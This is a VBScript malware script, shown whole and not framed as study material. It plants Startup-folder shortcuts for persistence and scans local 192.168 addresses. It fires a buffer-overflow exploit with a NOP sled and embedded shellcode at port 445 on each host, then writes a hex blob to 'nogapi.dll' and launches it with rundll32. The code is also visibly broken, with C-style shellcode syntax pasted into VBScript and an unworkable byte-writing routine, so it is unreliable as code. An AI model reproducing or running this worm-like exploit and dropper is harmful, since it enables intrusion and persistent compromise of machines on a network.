Dim filenames(4)
filenames(0) = "wbs.vbs"
filenames(1) = "jtg.vbs"
filenames(2) = "lj.vbs"
filenames(3) = "go.bat"
filenames(4) = "nogapi.dll"

Dim currentDirectory
Set fso = CreateObject("Scripting.FileSystemObject")
currentDirectory = fso.GetAbsolutePathName(".")

Set files = fso.GetFolder(currentDirectory).Files
For Each file In files
    For Each filename In filenames
        If LCase(file.Name) = LCase(filename) Then
            Set WshShell = CreateObject("WScript.Shell")
            startupPath = WshShell.SpecialFolders("Startup")
            Set registryKey = WshShell.CreateShortcut(startupPath & "\" & file.Name & ".lnk")
            registryKey.TargetPath = file.Path
            registryKey.Save
            Exit For
        End If
    Next
Next
Function GetIPAddresses()
  Dim arrIPAddresses
  arrIPAddresses = Array()
  
  Dim objWMIService
  Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
  
  Dim colItems
  Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
  
  Dim objItem
  For Each objItem in colItems
    Dim arrIPAddress
    arrIPAddress = objItem.IPAddress
    For Each strIPAddress in arrIPAddress
      If Left(strIPAddress, 7) = "192.168" Then
        ReDim Preserve arrIPAddresses(UBound(arrIPAddresses) + 1)
        arrIPAddresses(UBound(arrIPAddresses)) = strIPAddress
      End If
    Next
  Next
  
  GetIPAddresses = arrIPAddresses
End Function

Function s78()
    Dim arrIPAddresses
    arrIPAddresses = GetIPAddresses()

    For Each strIPAddress in arrIPAddresses
    On Error Resume Next
    Set tcpClient = CreateObject("MSWinsock.Winsock")
    host = strIPAddress
    port = 445
    offset = 2000

    ' Offset and return address
    ret = Array(&H8F, &H35, &H4A, &H5F)

    shellcode = Array(unsigned char shellcode[] = 
"\xbe\x9c\x9f\x08\x01\xda\xde\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x78\x31\x72\x14\x03\x72\x14\x83\xea\xfc\x7e\x6a\xf4\xe9\xf7"
"\x95\x05\xea\x67\x1f\xe0\xdb\xb5\x7b\x60\x49\x09\x0f\x24\x62"
"\xe2\x5d\xdd\xf1\x86\x49\xd2\xb2\x2c\xac\xdd\x43\x81\x70\xb1"
"\x80\x80\x0c\xc8\xd4\x62\x2c\x03\x29\x63\x69\x7e\xc2\x31\x22"
"\xf4\x71\xa5\x47\x48\x4a\xc4\x87\xc6\xf2\xbe\xa2\x19\x86\x74"
"\xac\x49\x37\x03\xe6\x71\x33\x4b\xd7\x80\x90\x88\x2b\xca\x9d"
"\x7a\xdf\xcd\x77\xb3\x20\xfc\xb7\x1f\x1f\x30\x3a\x5e\x67\xf7"
"\xa5\x15\x93\x0b\x5b\x2d\x60\x71\x87\xb8\x75\xd1\x4c\x1a\x5e"
"\xe3\x81\xfc\x15\xef\x6e\x8b\x72\xec\x71\x58\x09\x08\xf9\x5f"
"\xde\x98\xb9\x7b\xfa\xc1\x1a\xe2\x5b\xac\xcd\x1b\xbb\x08\xb1"
"\xb9\xb7\xbb\xa6\xbb\x95\xd3\x56\xa6\x51\x24\xcf\x5f\xf3\x4a"
"\x66\x16\xe5\xc7\x10\x64\x9d\xc1\xe7\x8b\xb4\x3f\x17\x24\x60"
"\x17\xb0\x9c\xe6\xad\x68\x59\x50\x2e\x41\x72\xfd\x8a\x5b\x4d"
"\x53\x7c\xf6\x4e\x05\x2f\x6e\xeb\xa4\xcf\x6e\x58\xf7\xa7\x39"
"\xd7\x68\xf1\x39\x32\x7d\xb1\x9c\x8d\x50\x1c\x77\xed\x66\x01"
"\x03\xbf\xd4\x13\x5d\x6d\x89\xfb\xb6\xc4\x07\xc7\xb7\x33\xde"
"\xf1\x22\xab\xba\x95\x32\xf8\x3c\x66\xba\x1e\x56\x62\xec\xb4"
"\xb8\x3c\x64\x3d\x81\x5e\xf2\x42\xd8\x6e\x04\xeb\xb4\xc7\xad"
"\x45\x53\xc5\x57\x71\xd8\xea\x8d\x04\xde\x60\x6d\x4d\xd0\x0e"
"\xd1\x51\xee\x0e\xf9\x80\x07\xbc\xfd\x22\xd8\x29\x51\xdd\x27"
"\x56\x85\x53\xb9\xc7\xbe\xea\x54\x79\x51\x3b\x90\x4e\x9a\x74"
"\xe9\x87\xd3\x4d\x3a\x9c\x73\xd4\x37\x35\xe8\x7a\xc1\xbf\x9f"
"\xec\x54\x6f\x12\x91\xe1\x40\xbf\x30\x67\xf1\x10\xdf\x05\x23"
"\x19\x7d\x99\x3b\x0e\xea\x6c\xfc\x8f\xbc\xe4\xfe\x45\x3e\xa9"
"\x94\x9b\x54\x4b\x3e\xf4\x72\xbd\x1a\x4b\x7d\x97\x08\x65\x41"
"\x7e\x97\x82\x42\x56\x23\xde\xc9\xe4\x8f\xd7\xe0\x34\x7b\xe4"
"\x52\xe4\xd2\x83\x40\x90\x52\xb1\x9b\x49\xe1\xf6\x17\x5f\xb2"
"\x73\x17\xeb\x54\x16\x97\x40\x09\x6b\xd3\x4c\xa5\x23\x88\xe4"
"\x98\x94\x80\xae\x1d\xcf\x5f\xbc\xe6\x1b\x91\x6e\x8f\x1d\xbb"
"\x16\x1d\x5d\x16\x72\xa2\xf6\xf0\xb2\x29\x97\x87\x4a\xf8\x02"
"\x87\xdc\xf3\x66\x25\x4a\x0b\x5d\xc1\xe3\x0c\xa1\xee\x76\x86"
"\x30\x74\x46\x59\xe3\x11\xd0\xfc\xfb\x31\xc1\x01\x04\x3e\x65"
"\x97\x8f\xa8\x1f\x05\x5e\x4b\x8f\xa4\x9e";
)

    buf = "USER " & String(offset, "A") & ChrW(ret(0)) & ChrW(ret(1)) & ChrW(ret(2)) & ChrW(ret(3))
    For i = 1 To 20
        buf = buf & ChrW(&H90)
    Next
    For i = 0 To UBound(shellcode)
        buf = buf & ChrW(shellcode(i))
    Next
    buf = buf & vbCrLf

    tcpClient.Connect host, port

    tcpClient.SendData buf

    Do While tcpClient.State <> 0
        If tcpClient.State = 7 Then
            response = tcpClient.GetData
            WScript.Echo response
            Exit Do
        End If
        WScript.Sleep 100
    Loop

    tcpClient.Close
    If Err.Number = 0 Then
        ' Script executed successfully on remote machine
    End If
    Next
End Function

Function dmn()
Set objShell = CreateObject("WScript.Shell")
strCode = "dbc0d97424f4ba14a8d9755f31c9b17131571883effc0357004a2c89c003cf721074599721a63dd3137635b19ffd1b221473b4459d3ee2681e8f2a26dc91d6353072e6f545732feba521f86717d68d3aabd7413193afe486671ae6d6d711a0ce5c7d11eeb19d6db9be56053816a7e60a5664d9a25b741d04830355763e14ae04e49133ae6f01904ebcd4535c09923c418c77377d057698f75d5d3c5306fc6539e90175e556a4fd0483de5f413dba2b91a933bdff4035db54fa095373fd6e4e4afec626fa57bfa03e014696c07853bb65b36d6dcbd96edfba75cade3c857fb154d2f6ae6323dd3a2482ef6ee95c10bdae184293fc713143699ae04d52a3de1b6231f1400345c276d3ccc51dd79e6ffd81760547b0001a92fdf3b24aa95c6b1d78648ba67dbd2e98f7227a167c207c287c33adc1f2c34e12e36fb1ed0c407c658aaee7fd42ac86899adb22435b44e5c95910075e34e66d5c9f8eab96c501b38269ac8b4b36ca08bd828683f12e2eadc99b2d9d98b5590f8db37bd06446bb5baa11be64c0b7aa647de8a7215904e7fac939505352bd8b288945d8e1012ed86822fc1b414701b402a98a55543659c35aa192a6f967ac1d1517ad62196a27f282baf6242ec59d385830a1c767573443eccdb4856f6f4dbb00178356b082db"
For i = 1 to Len(strCode) Step 2
    objShell.Run "cmd /c echo|" & Mid(strCode, i, 2) & " /nologo >> nogapi.dll", 0, True
Next
dllPath = "nogapi.dll"

Set kernel32 = GetObject("winmgmts:root\cimv2:Win32_Process")
result = kernel32.Create("rundll32 """ & dllPath & """,DllRegisterServer")
End Function
s78()
dmn()
